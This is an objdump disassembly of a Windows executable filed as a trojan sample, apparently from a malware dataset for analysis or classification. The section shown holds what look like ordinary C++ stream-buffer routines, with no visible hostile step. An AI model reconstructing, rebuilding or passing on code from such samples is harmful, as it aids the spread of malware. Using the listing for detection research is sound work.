
malware_samples/trojan/3856bf5d8508d54624bb9b626e5572240bd15469a37300ded86420f20fa18a8d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	51                   	push   %ecx
  401004:	53                   	push   %ebx
  401005:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401008:	56                   	push   %esi
  401009:	8b f1                	mov    %ecx,%esi
  40100b:	83 fb ff             	cmp    $0xffffffff,%ebx
  40100e:	75 0a                	jne    0x40101a
  401010:	5e                   	pop    %esi
  401011:	33 c0                	xor    %eax,%eax
  401013:	5b                   	pop    %ebx
  401014:	8b e5                	mov    %ebp,%esp
  401016:	5d                   	pop    %ebp
  401017:	c2 04 00             	ret    $0x4
  40101a:	8b 46 24             	mov    0x24(%esi),%eax
  40101d:	8b 08                	mov    (%eax),%ecx
  40101f:	85 c9                	test   %ecx,%ecx
  401021:	74 22                	je     0x401045
  401023:	8b 56 34             	mov    0x34(%esi),%edx
  401026:	8b 12                	mov    (%edx),%edx
  401028:	8b c1                	mov    %ecx,%eax
  40102a:	03 d0                	add    %eax,%edx
  40102c:	3b c2                	cmp    %edx,%eax
  40102e:	73 15                	jae    0x401045
  401030:	8b ce                	mov    %esi,%ecx
  401032:	ff 15 08 a1 40 00    	call   *0x40a108
  401038:	88 18                	mov    %bl,(%eax)
  40103a:	5e                   	pop    %esi
  40103b:	0f b6 c3             	movzbl %bl,%eax
  40103e:	5b                   	pop    %ebx
  40103f:	8b e5                	mov    %ebp,%esp
  401041:	5d                   	pop    %ebp
  401042:	c2 04 00             	ret    $0x4
  401045:	8b 46 48             	mov    0x48(%esi),%eax
  401048:	a8 04                	test   $0x4,%al
  40104a:	0f 84 5f 01 00 00    	je     0x4011af
  401050:	a8 0a                	test   $0xa,%al
  401052:	0f 85 57 01 00 00    	jne    0x4011af
  401058:	8b 46 20             	mov    0x20(%esi),%eax
  40105b:	83 38 00             	cmpl   $0x0,(%eax)
  40105e:	75 04                	jne    0x401064
  401060:	33 db                	xor    %ebx,%ebx
  401062:	eb 0c                	jmp    0x401070
  401064:	8b 56 34             	mov    0x34(%esi),%edx
  401067:	8b 46 10             	mov    0x10(%esi),%eax
  40106a:	8b 1a                	mov    (%edx),%ebx
  40106c:	2b 18                	sub    (%eax),%ebx
  40106e:	03 d9                	add    %ecx,%ebx
  401070:	8b 4e 3c             	mov    0x3c(%esi),%ecx
  401073:	8b c3                	mov    %ebx,%eax
  401075:	99                   	cltd
  401076:	2b c2                	sub    %edx,%eax
  401078:	d1 f8                	sar    $1,%eax
  40107a:	3b c1                	cmp    %ecx,%eax
  40107c:	7d 02                	jge    0x401080
  40107e:	8b c1                	mov    %ecx,%eax
  401080:	57                   	push   %edi
  401081:	c7 46 3c 20 00 00 00 	movl   $0x20,0x3c(%esi)
  401088:	85 c0                	test   %eax,%eax
  40108a:	7e 47                	jle    0x4010d3
  40108c:	8d 64 24 00          	lea    0x0(%esp),%esp
  401090:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  401095:	2b c8                	sub    %eax,%ecx
  401097:	3b cb                	cmp    %ebx,%ecx
  401099:	7d 15                	jge    0x4010b0
  40109b:	99                   	cltd
  40109c:	2b c2                	sub    %edx,%eax
  40109e:	d1 f8                	sar    $1,%eax
  4010a0:	85 c0                	test   %eax,%eax
  4010a2:	7f ec                	jg     0x401090
  4010a4:	5f                   	pop    %edi
  4010a5:	5e                   	pop    %esi
  4010a6:	83 c8 ff             	or     $0xffffffff,%eax
  4010a9:	5b                   	pop    %ebx
  4010aa:	8b e5                	mov    %ebp,%esp
  4010ac:	5d                   	pop    %ebp
  4010ad:	c2 04 00             	ret    $0x4
  4010b0:	85 c0                	test   %eax,%eax
  4010b2:	7e 1f                	jle    0x4010d3
  4010b4:	8b 4e 4c             	mov    0x4c(%esi),%ecx
  4010b7:	03 c3                	add    %ebx,%eax
  4010b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4010bc:	50                   	push   %eax
  4010bd:	85 c9                	test   %ecx,%ecx
  4010bf:	74 04                	je     0x4010c5
  4010c1:	ff d1                	call   *%ecx
  4010c3:	eb 05                	jmp    0x4010ca
  4010c5:	e8 ae 6f 00 00       	call   0x408078
  4010ca:	8b f8                	mov    %eax,%edi
  4010cc:	83 c4 04             	add    $0x4,%esp
  4010cf:	85 ff                	test   %edi,%edi
  4010d1:	75 0c                	jne    0x4010df
  4010d3:	5f                   	pop    %edi
  4010d4:	5e                   	pop    %esi
  4010d5:	83 c8 ff             	or     $0xffffffff,%eax
  4010d8:	5b                   	pop    %ebx
  4010d9:	8b e5                	mov    %ebp,%esp
  4010db:	5d                   	pop    %ebp
  4010dc:	c2 04 00             	ret    $0x4
  4010df:	85 db                	test   %ebx,%ebx
  4010e1:	7e 10                	jle    0x4010f3
  4010e3:	8b 56 10             	mov    0x10(%esi),%edx
  4010e6:	8b 02                	mov    (%edx),%eax
  4010e8:	53                   	push   %ebx
  4010e9:	50                   	push   %eax
  4010ea:	57                   	push   %edi
  4010eb:	e8 42 7a 00 00       	call   0x408b32
  4010f0:	83 c4 0c             	add    $0xc,%esp
  4010f3:	f6 46 48 01          	testb  $0x1,0x48(%esi)
  4010f7:	74 20                	je     0x401119
  4010f9:	8b 46 50             	mov    0x50(%esi),%eax
  4010fc:	85 c0                	test   %eax,%eax
  4010fe:	74 0a                	je     0x40110a
  401100:	8b 4e 10             	mov    0x10(%esi),%ecx
  401103:	8b 11                	mov    (%ecx),%edx
  401105:	52                   	push   %edx
  401106:	ff d0                	call   *%eax
  401108:	eb 0c                	jmp    0x401116
  40110a:	8b 46 10             	mov    0x10(%esi),%eax
  40110d:	8b 08                	mov    (%eax),%ecx
  40110f:	51                   	push   %ecx
  401110:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  401116:	83 c4 04             	add    $0x4,%esp
  401119:	83 4e 48 01          	orl    $0x1,0x48(%esi)
  40111d:	85 db                	test   %ebx,%ebx
  40111f:	75 26                	jne    0x401147
  401121:	8b 56 14             	mov    0x14(%esi),%edx
  401124:	89 7e 44             	mov    %edi,0x44(%esi)
  401127:	89 3a                	mov    %edi,(%edx)
  401129:	8b 46 24             	mov    0x24(%esi),%eax
  40112c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40112f:	89 38                	mov    %edi,(%eax)
  401131:	8b 4e 34             	mov    0x34(%esi),%ecx
  401134:	89 11                	mov    %edx,(%ecx)
  401136:	8b 46 10             	mov    0x10(%esi),%eax
  401139:	89 38                	mov    %edi,(%eax)
  40113b:	8b 4e 20             	mov    0x20(%esi),%ecx
  40113e:	89 39                	mov    %edi,(%ecx)
  401140:	8b 56 30             	mov    0x30(%esi),%edx
  401143:	89 1a                	mov    %ebx,(%edx)
  401145:	eb 4f                	jmp    0x401196
  401147:	8b 46 10             	mov    0x10(%esi),%eax
  40114a:	8b 56 24             	mov    0x24(%esi),%edx
  40114d:	8b cf                	mov    %edi,%ecx
  40114f:	2b 08                	sub    (%eax),%ecx
  401151:	8b df                	mov    %edi,%ebx
  401153:	01 4e 44             	add    %ecx,0x44(%esi)
  401156:	8b 08                	mov    (%eax),%ecx
  401158:	8b 02                	mov    (%edx),%eax
  40115a:	8b 56 14             	mov    0x14(%esi),%edx
  40115d:	2b c1                	sub    %ecx,%eax
  40115f:	03 c7                	add    %edi,%eax
  401161:	2b d9                	sub    %ecx,%ebx
  401163:	01 1a                	add    %ebx,(%edx)
  401165:	8b 4e 24             	mov    0x24(%esi),%ecx
  401168:	89 01                	mov    %eax,(%ecx)
  40116a:	8b d7                	mov    %edi,%edx
  40116c:	2b d0                	sub    %eax,%edx
  40116e:	03 55 fc             	add    -0x4(%ebp),%edx
  401171:	8b 46 34             	mov    0x34(%esi),%eax
  401174:	89 10                	mov    %edx,(%eax)
  401176:	8b 46 20             	mov    0x20(%esi),%eax
  401179:	8b 00                	mov    (%eax),%eax
  40117b:	8b 56 10             	mov    0x10(%esi),%edx
  40117e:	2b 02                	sub    (%edx),%eax
  401180:	8b 4e 24             	mov    0x24(%esi),%ecx
  401183:	8b 09                	mov    (%ecx),%ecx
  401185:	03 c7                	add    %edi,%eax
  401187:	89 3a                	mov    %edi,(%edx)
  401189:	8b 56 20             	mov    0x20(%esi),%edx
  40118c:	2b c8                	sub    %eax,%ecx
  40118e:	89 02                	mov    %eax,(%edx)
  401190:	8b 46 30             	mov    0x30(%esi),%eax
  401193:	41                   	inc    %ecx
  401194:	89 08                	mov    %ecx,(%eax)
  401196:	8b ce                	mov    %esi,%ecx
  401198:	ff 15 08 a1 40 00    	call   *0x40a108
  40119e:	8a 4d 08             	mov    0x8(%ebp),%cl
  4011a1:	5f                   	pop    %edi
  4011a2:	5e                   	pop    %esi
  4011a3:	88 08                	mov    %cl,(%eax)
  4011a5:	0f b6 c1             	movzbl %cl,%eax
  4011a8:	5b                   	pop    %ebx
  4011a9:	8b e5                	mov    %ebp,%esp
  4011ab:	5d                   	pop    %ebp
  4011ac:	c2 04 00             	ret    $0x4
  4011af:	5e                   	pop    %esi
  4011b0:	83 c8 ff             	or     $0xffffffff,%eax
  4011b3:	5b                   	pop    %ebx
  4011b4:	8b e5                	mov    %ebp,%esp
  4011b6:	5d                   	pop    %ebp
  4011b7:	c2 04 00             	ret    $0x4
  4011ba:	cc                   	int3
  4011bb:	cc                   	int3
  4011bc:	cc                   	int3
  4011bd:	cc                   	int3
  4011be:	cc                   	int3
  4011bf:	cc                   	int3
  4011c0:	55                   	push   %ebp
  4011c1:	8b ec                	mov    %esp,%ebp
  4011c3:	8b 41 20             	mov    0x20(%ecx),%eax
  4011c6:	8b 10                	mov    (%eax),%edx
  4011c8:	85 d2                	test   %edx,%edx
  4011ca:	74 41                	je     0x40120d
  4011cc:	8b 41 10             	mov    0x10(%ecx),%eax
  4011cf:	3b 10                	cmp    (%eax),%edx
  4011d1:	76 3a                	jbe    0x40120d
  4011d3:	8b 45 08             	mov    0x8(%ebp),%eax
  4011d6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4011d9:	74 0b                	je     0x4011e6
  4011db:	3a 42 ff             	cmp    -0x1(%edx),%al
  4011de:	74 06                	je     0x4011e6
  4011e0:	f6 41 48 02          	testb  $0x2,0x48(%ecx)
  4011e4:	75 27                	jne    0x40120d
  4011e6:	8b 51 30             	mov    0x30(%ecx),%edx
  4011e9:	ff 02                	incl   (%edx)
  4011eb:	8b 51 20             	mov    0x20(%ecx),%edx
  4011ee:	ff 0a                	decl   (%edx)
  4011f0:	83 f8 ff             	cmp    $0xffffffff,%eax
  4011f3:	74 12                	je     0x401207
  4011f5:	8b 49 20             	mov    0x20(%ecx),%ecx
  4011f8:	8b 09                	mov    (%ecx),%ecx
  4011fa:	38 01                	cmp    %al,(%ecx)
  4011fc:	74 02                	je     0x401200
  4011fe:	88 01                	mov    %al,(%ecx)
  401200:	0f b6 c0             	movzbl %al,%eax
  401203:	5d                   	pop    %ebp
  401204:	c2 04 00             	ret    $0x4
  401207:	33 c0                	xor    %eax,%eax
  401209:	5d                   	pop    %ebp
  40120a:	c2 04 00             	ret    $0x4
  40120d:	83 c8 ff             	or     $0xffffffff,%eax
  401210:	5d                   	pop    %ebp
  401211:	c2 04 00             	ret    $0x4
  401214:	cc                   	int3
  401215:	cc                   	int3
  401216:	cc                   	int3
  401217:	cc                   	int3
  401218:	cc                   	int3
  401219:	cc                   	int3
  40121a:	cc                   	int3
  40121b:	cc                   	int3
  40121c:	cc                   	int3
  40121d:	cc                   	int3
  40121e:	cc                   	int3
  40121f:	cc                   	int3
  401220:	8b 41 20             	mov    0x20(%ecx),%eax
  401223:	56                   	push   %esi
  401224:	8b 30                	mov    (%eax),%esi
  401226:	85 f6                	test   %esi,%esi
  401228:	75 05                	jne    0x40122f
  40122a:	83 c8 ff             	or     $0xffffffff,%eax
  40122d:	5e                   	pop    %esi
  40122e:	c3                   	ret
  40122f:	53                   	push   %ebx
  401230:	57                   	push   %edi
  401231:	8b 79 30             	mov    0x30(%ecx),%edi
  401234:	8b 1f                	mov    (%edi),%ebx
  401236:	8b d6                	mov    %esi,%edx
  401238:	03 da                	add    %edx,%ebx
  40123a:	3b d3                	cmp    %ebx,%edx
  40123c:	73 07                	jae    0x401245
  40123e:	0f b6 06             	movzbl (%esi),%eax
  401241:	5f                   	pop    %edi
  401242:	5b                   	pop    %ebx
  401243:	5e                   	pop    %esi
  401244:	c3                   	ret
  401245:	8b 51 24             	mov    0x24(%ecx),%edx
  401248:	8b 12                	mov    (%edx),%edx
  40124a:	85 d2                	test   %edx,%edx
  40124c:	74 26                	je     0x401274
  40124e:	3b d6                	cmp    %esi,%edx
  401250:	77 05                	ja     0x401257
  401252:	39 71 44             	cmp    %esi,0x44(%ecx)
  401255:	76 1d                	jbe    0x401274
  401257:	39 51 44             	cmp    %edx,0x44(%ecx)
  40125a:	73 03                	jae    0x40125f
  40125c:	89 51 44             	mov    %edx,0x44(%ecx)
  40125f:	8b 10                	mov    (%eax),%edx
  401261:	8b 41 44             	mov    0x44(%ecx),%eax
  401264:	2b c2                	sub    %edx,%eax
  401266:	89 07                	mov    %eax,(%edi)
  401268:	8b 41 20             	mov    0x20(%ecx),%eax
  40126b:	8b 00                	mov    (%eax),%eax
  40126d:	0f b6 00             	movzbl (%eax),%eax
  401270:	5f                   	pop    %edi
  401271:	5b                   	pop    %ebx
  401272:	5e                   	pop    %esi
  401273:	c3                   	ret
  401274:	5f                   	pop    %edi
  401275:	5b                   	pop    %ebx
  401276:	83 c8 ff             	or     $0xffffffff,%eax
  401279:	5e                   	pop    %esi
  40127a:	c3                   	ret
  40127b:	cc                   	int3
  40127c:	cc                   	int3
  40127d:	cc                   	int3
  40127e:	cc                   	int3
  40127f:	cc                   	int3
  401280:	55                   	push   %ebp
  401281:	8b ec                	mov    %esp,%ebp
  401283:	53                   	push   %ebx
  401284:	56                   	push   %esi
  401285:	8b 71 24             	mov    0x24(%ecx),%esi
  401288:	8b 16                	mov    (%esi),%edx
  40128a:	57                   	push   %edi
  40128b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40128e:	8b c7                	mov    %edi,%eax
  401290:	85 d2                	test   %edx,%edx
  401292:	74 0a                	je     0x40129e
  401294:	8b 59 44             	mov    0x44(%ecx),%ebx
  401297:	2b da                	sub    %edx,%ebx
  401299:	79 03                	jns    0x40129e
  40129b:	89 51 44             	mov    %edx,0x44(%ecx)
  40129e:	8a 55 18             	mov    0x18(%ebp),%dl
  4012a1:	f6 c2 01             	test   $0x1,%dl
  4012a4:	0f 84 99 00 00 00    	je     0x401343
  4012aa:	8b 59 20             	mov    0x20(%ecx),%ebx
  4012ad:	8b 1b                	mov    (%ebx),%ebx
  4012af:	85 db                	test   %ebx,%ebx
  4012b1:	0f 84 8c 00 00 00    	je     0x401343
  4012b7:	8b 55 14             	mov    0x14(%ebp),%edx
  4012ba:	8b 35 b4 a0 40 00    	mov    0x40a0b4,%esi
  4012c0:	83 fa 02             	cmp    $0x2,%edx
  4012c3:	75 0c                	jne    0x4012d1
  4012c5:	8b 51 10             	mov    0x10(%ecx),%edx
  4012c8:	8b 41 44             	mov    0x44(%ecx),%eax
  4012cb:	2b 02                	sub    (%edx),%eax
  4012cd:	03 c7                	add    %edi,%eax
  4012cf:	eb 20                	jmp    0x4012f1
  4012d1:	83 fa 01             	cmp    $0x1,%edx
  4012d4:	75 11                	jne    0x4012e7
  4012d6:	f6 45 18 02          	testb  $0x2,0x18(%ebp)
  4012da:	75 13                	jne    0x4012ef
  4012dc:	8b 51 10             	mov    0x10(%ecx),%edx
  4012df:	8b c3                	mov    %ebx,%eax
  4012e1:	2b 02                	sub    (%edx),%eax
  4012e3:	03 c7                	add    %edi,%eax
  4012e5:	eb 0a                	jmp    0x4012f1
  4012e7:	85 d2                	test   %edx,%edx
  4012e9:	75 04                	jne    0x4012ef
  4012eb:	3b 3e                	cmp    (%esi),%edi
  4012ed:	75 02                	jne    0x4012f1
  4012ef:	8b 06                	mov    (%esi),%eax
  4012f1:	85 c0                	test   %eax,%eax
  4012f3:	78 4a                	js     0x40133f
  4012f5:	8b 51 10             	mov    0x10(%ecx),%edx
  4012f8:	8b 12                	mov    (%edx),%edx
  4012fa:	8b 79 44             	mov    0x44(%ecx),%edi
  4012fd:	2b fa                	sub    %edx,%edi
  4012ff:	3b c7                	cmp    %edi,%eax
  401301:	7f 3c                	jg     0x40133f
  401303:	8b 71 30             	mov    0x30(%ecx),%esi
  401306:	2b d3                	sub    %ebx,%edx
  401308:	03 d0                	add    %eax,%edx
  40130a:	29 16                	sub    %edx,(%esi)
  40130c:	8b 71 20             	mov    0x20(%ecx),%esi
  40130f:	01 16                	add    %edx,(%esi)
  401311:	f6 45 18 02          	testb  $0x2,0x18(%ebp)
  401315:	0f 84 94 00 00 00    	je     0x4013af
  40131b:	8b 79 24             	mov    0x24(%ecx),%edi
  40131e:	8b 37                	mov    (%edi),%esi
  401320:	85 f6                	test   %esi,%esi
  401322:	0f 84 87 00 00 00    	je     0x4013af
  401328:	8b 51 34             	mov    0x34(%ecx),%edx
  40132b:	8b 12                	mov    (%edx),%edx
  40132d:	03 d6                	add    %esi,%edx
  40132f:	8b 71 20             	mov    0x20(%ecx),%esi
  401332:	8b 36                	mov    (%esi),%esi
  401334:	89 37                	mov    %esi,(%edi)
  401336:	8b 49 34             	mov    0x34(%ecx),%ecx
  401339:	2b d6                	sub    %esi,%edx
  40133b:	89 11                	mov    %edx,(%ecx)
  40133d:	eb 70                	jmp    0x4013af
  40133f:	8b 06                	mov    (%esi),%eax
  401341:	eb 6c                	jmp    0x4013af
  401343:	f6 c2 02             	test   $0x2,%dl
  401346:	74 60                	je     0x4013a8
  401348:	8b 36                	mov    (%esi),%esi
  40134a:	85 f6                	test   %esi,%esi
  40134c:	74 5a                	je     0x4013a8
  40134e:	8b 55 14             	mov    0x14(%ebp),%edx
  401351:	8b 1d b4 a0 40 00    	mov    0x40a0b4,%ebx
  401357:	83 fa 02             	cmp    $0x2,%edx
  40135a:	75 0c                	jne    0x401368
  40135c:	8b 51 10             	mov    0x10(%ecx),%edx
  40135f:	8b 41 44             	mov    0x44(%ecx),%eax
  401362:	2b 02                	sub    (%edx),%eax
  401364:	03 c7                	add    %edi,%eax
  401366:	eb 1a                	jmp    0x401382
  401368:	83 fa 01             	cmp    $0x1,%edx
  40136b:	75 0b                	jne    0x401378
  40136d:	8b 51 10             	mov    0x10(%ecx),%edx
  401370:	8b c6                	mov    %esi,%eax
  401372:	2b 02                	sub    (%edx),%eax
  401374:	03 c7                	add    %edi,%eax
  401376:	eb 0a                	jmp    0x401382
  401378:	85 d2                	test   %edx,%edx
  40137a:	75 04                	jne    0x401380
  40137c:	3b 3b                	cmp    (%ebx),%edi
  40137e:	75 02                	jne    0x401382
  401380:	8b 03                	mov    (%ebx),%eax
  401382:	85 c0                	test   %eax,%eax
  401384:	78 1e                	js     0x4013a4
  401386:	8b 51 10             	mov    0x10(%ecx),%edx
  401389:	8b 12                	mov    (%edx),%edx
  40138b:	8b 79 44             	mov    0x44(%ecx),%edi
  40138e:	2b fa                	sub    %edx,%edi
  401390:	3b c7                	cmp    %edi,%eax
  401392:	7f 10                	jg     0x4013a4
  401394:	2b d6                	sub    %esi,%edx
  401396:	8b 71 34             	mov    0x34(%ecx),%esi
  401399:	03 d0                	add    %eax,%edx
  40139b:	29 16                	sub    %edx,(%esi)
  40139d:	8b 49 24             	mov    0x24(%ecx),%ecx
  4013a0:	01 11                	add    %edx,(%ecx)
  4013a2:	eb 0b                	jmp    0x4013af
  4013a4:	8b 03                	mov    (%ebx),%eax
  4013a6:	eb 07                	jmp    0x4013af
  4013a8:	a1 b4 a0 40 00       	mov    0x40a0b4,%eax
  4013ad:	8b 00                	mov    (%eax),%eax
  4013af:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4013b2:	99                   	cltd
  4013b3:	89 01                	mov    %eax,(%ecx)
  4013b5:	33 c0                	xor    %eax,%eax
  4013b7:	5f                   	pop    %edi
  4013b8:	5e                   	pop    %esi
  4013b9:	89 41 08             	mov    %eax,0x8(%ecx)
  4013bc:	89 41 0c             	mov    %eax,0xc(%ecx)
  4013bf:	89 41 10             	mov    %eax,0x10(%ecx)
  4013c2:	89 51 04             	mov    %edx,0x4(%ecx)
  4013c5:	8b c1                	mov    %ecx,%eax
  4013c7:	5b                   	pop    %ebx
  4013c8:	5d                   	pop    %ebp
  4013c9:	c2 14 00             	ret    $0x14
  4013cc:	cc                   	int3
  4013cd:	cc                   	int3
  4013ce:	cc                   	int3
  4013cf:	cc                   	int3
  4013d0:	55                   	push   %ebp
  4013d1:	8b ec                	mov    %esp,%ebp
  4013d3:	51                   	push   %ecx
  4013d4:	8b 45 14             	mov    0x14(%ebp),%eax
  4013d7:	03 45 0c             	add    0xc(%ebp),%eax
  4013da:	56                   	push   %esi
  4013db:	57                   	push   %edi
  4013dc:	8b 79 24             	mov    0x24(%ecx),%edi
  4013df:	8b 17                	mov    (%edi),%edx
  4013e1:	85 d2                	test   %edx,%edx
  4013e3:	74 0a                	je     0x4013ef
  4013e5:	8b 71 44             	mov    0x44(%ecx),%esi
  4013e8:	2b f2                	sub    %edx,%esi
  4013ea:	79 03                	jns    0x4013ef
  4013ec:	89 51 44             	mov    %edx,0x44(%ecx)
  4013ef:	8b 15 b4 a0 40 00    	mov    0x40a0b4,%edx
  4013f5:	8b 12                	mov    (%edx),%edx
  4013f7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4013fa:	3b c2                	cmp    %edx,%eax
  4013fc:	0f 84 8a 00 00 00    	je     0x40148c
  401402:	53                   	push   %ebx
  401403:	8a 5d 24             	mov    0x24(%ebp),%bl
  401406:	f6 c3 01             	test   $0x1,%bl
  401409:	74 4e                	je     0x401459
  40140b:	8b 71 20             	mov    0x20(%ecx),%esi
  40140e:	8b 36                	mov    (%esi),%esi
  401410:	85 f6                	test   %esi,%esi
  401412:	74 45                	je     0x401459
  401414:	85 c0                	test   %eax,%eax
  401416:	78 71                	js     0x401489
  401418:	8b 51 10             	mov    0x10(%ecx),%edx
  40141b:	8b 12                	mov    (%edx),%edx
  40141d:	8b 79 44             	mov    0x44(%ecx),%edi
  401420:	2b fa                	sub    %edx,%edi
  401422:	3b c7                	cmp    %edi,%eax
  401424:	7f 60                	jg     0x401486
  401426:	2b d6                	sub    %esi,%edx
  401428:	8b 71 30             	mov    0x30(%ecx),%esi
  40142b:	03 d0                	add    %eax,%edx
  40142d:	29 16                	sub    %edx,(%esi)
  40142f:	8b 71 20             	mov    0x20(%ecx),%esi
  401432:	01 16                	add    %edx,(%esi)
  401434:	f6 c3 02             	test   $0x2,%bl
  401437:	74 52                	je     0x40148b
  401439:	8b 79 24             	mov    0x24(%ecx),%edi
  40143c:	8b 37                	mov    (%edi),%esi
  40143e:	85 f6                	test   %esi,%esi
  401440:	74 49                	je     0x40148b
  401442:	8b 51 34             	mov    0x34(%ecx),%edx
  401445:	8b 12                	mov    (%edx),%edx
  401447:	03 d6                	add    %esi,%edx
  401449:	8b 71 20             	mov    0x20(%ecx),%esi
  40144c:	8b 36                	mov    (%esi),%esi
  40144e:	89 37                	mov    %esi,(%edi)
  401450:	8b 49 34             	mov    0x34(%ecx),%ecx
  401453:	2b d6                	sub    %esi,%edx
  401455:	89 11                	mov    %edx,(%ecx)
  401457:	eb 32                	jmp    0x40148b
  401459:	f6 c3 02             	test   $0x2,%bl
  40145c:	74 2b                	je     0x401489
  40145e:	8b 3f                	mov    (%edi),%edi
  401460:	85 ff                	test   %edi,%edi
  401462:	74 25                	je     0x401489
  401464:	85 c0                	test   %eax,%eax
  401466:	78 21                	js     0x401489
  401468:	8b 51 10             	mov    0x10(%ecx),%edx
  40146b:	8b 12                	mov    (%edx),%edx
  40146d:	8b 71 44             	mov    0x44(%ecx),%esi
  401470:	2b f2                	sub    %edx,%esi
  401472:	3b c6                	cmp    %esi,%eax
  401474:	7f 10                	jg     0x401486
  401476:	8b 71 34             	mov    0x34(%ecx),%esi
  401479:	2b d7                	sub    %edi,%edx
  40147b:	03 d0                	add    %eax,%edx
  40147d:	29 16                	sub    %edx,(%esi)
  40147f:	8b 49 24             	mov    0x24(%ecx),%ecx
  401482:	01 11                	add    %edx,(%ecx)
  401484:	eb 05                	jmp    0x40148b
  401486:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401489:	8b c2                	mov    %edx,%eax
  40148b:	5b                   	pop    %ebx
  40148c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40148f:	99                   	cltd
  401490:	89 01                	mov    %eax,(%ecx)
  401492:	33 c0                	xor    %eax,%eax
  401494:	5f                   	pop    %edi
  401495:	89 41 08             	mov    %eax,0x8(%ecx)
  401498:	89 41 0c             	mov    %eax,0xc(%ecx)
  40149b:	89 41 10             	mov    %eax,0x10(%ecx)
  40149e:	89 51 04             	mov    %edx,0x4(%ecx)
  4014a1:	8b c1                	mov    %ecx,%eax
  4014a3:	5e                   	pop    %esi
  4014a4:	8b e5                	mov    %ebp,%esp
  4014a6:	5d                   	pop    %ebp
  4014a7:	c2 20 00             	ret    $0x20
  4014aa:	cc                   	int3
  4014ab:	cc                   	int3
  4014ac:	cc                   	int3
  4014ad:	cc                   	int3
  4014ae:	cc                   	int3
  4014af:	cc                   	int3
  4014b0:	55                   	push   %ebp
  4014b1:	8b ec                	mov    %esp,%ebp
  4014b3:	6a ff                	push   $0xffffffff
  4014b5:	68 d9 8c 40 00       	push   $0x408cd9
  4014ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4014c0:	50                   	push   %eax
  4014c1:	51                   	push   %ecx
  4014c2:	56                   	push   %esi
  4014c3:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4014c8:	33 c5                	xor    %ebp,%eax
  4014ca:	50                   	push   %eax
  4014cb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4014ce:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4014d4:	8b f1                	mov    %ecx,%esi
  4014d6:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4014d9:	c7 06 74 a3 40 00    	movl   $0x40a374,(%esi)
  4014df:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4014e6:	8b 46 48             	mov    0x48(%esi),%eax
  4014e9:	24 09                	and    $0x9,%al
  4014eb:	3c 01                	cmp    $0x1,%al
  4014ed:	75 20                	jne    0x40150f
  4014ef:	8b 46 50             	mov    0x50(%esi),%eax
  4014f2:	85 c0                	test   %eax,%eax
  4014f4:	74 0a                	je     0x401500
  4014f6:	8b 4e 10             	mov    0x10(%esi),%ecx
  4014f9:	8b 09                	mov    (%ecx),%ecx
  4014fb:	51                   	push   %ecx
  4014fc:	ff d0                	call   *%eax
  4014fe:	eb 0c                	jmp    0x40150c
  401500:	8b 56 10             	mov    0x10(%esi),%edx
  401503:	8b 02                	mov    (%edx),%eax
  401505:	50                   	push   %eax
  401506:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  40150c:	83 c4 04             	add    $0x4,%esp
  40150f:	83 66 48 f6          	andl   $0xfffffff6,0x48(%esi)
  401513:	8b ce                	mov    %esi,%ecx
  401515:	c7 46 44 00 00 00 00 	movl   $0x0,0x44(%esi)
  40151c:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401523:	ff 15 18 a1 40 00    	call   *0x40a118
  401529:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40152d:	74 0a                	je     0x401539
  40152f:	56                   	push   %esi
  401530:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  401536:	83 c4 04             	add    $0x4,%esp
  401539:	8b c6                	mov    %esi,%eax
  40153b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40153e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401545:	59                   	pop    %ecx
  401546:	5e                   	pop    %esi
  401547:	8b e5                	mov    %ebp,%esp
  401549:	5d                   	pop    %ebp
  40154a:	c2 04 00             	ret    $0x4
  40154d:	cc                   	int3
  40154e:	cc                   	int3
  40154f:	cc                   	int3
  401550:	55                   	push   %ebp
  401551:	8b ec                	mov    %esp,%ebp
  401553:	6a ff                	push   $0xffffffff
  401555:	68 b2 8c 40 00       	push   $0x408cb2
  40155a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401560:	50                   	push   %eax
  401561:	83 ec 08             	sub    $0x8,%esp
  401564:	53                   	push   %ebx
  401565:	56                   	push   %esi
  401566:	57                   	push   %edi
  401567:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40156c:	33 c5                	xor    %ebp,%eax
  40156e:	50                   	push   %eax
  40156f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401572:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401578:	8b 7d 08             	mov    0x8(%ebp),%edi
  40157b:	33 db                	xor    %ebx,%ebx
  40157d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  401580:	8d 4f 58             	lea    0x58(%edi),%ecx
  401583:	c7 07 b8 a3 40 00    	movl   $0x40a3b8,(%edi)
  401589:	ff 15 dc a0 40 00    	call   *0x40a0dc
  40158f:	53                   	push   %ebx
  401590:	53                   	push   %ebx
  401591:	8d 77 04             	lea    0x4(%edi),%esi
  401594:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401597:	56                   	push   %esi
  401598:	8b cf                	mov    %edi,%ecx
  40159a:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4015a1:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  4015a7:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
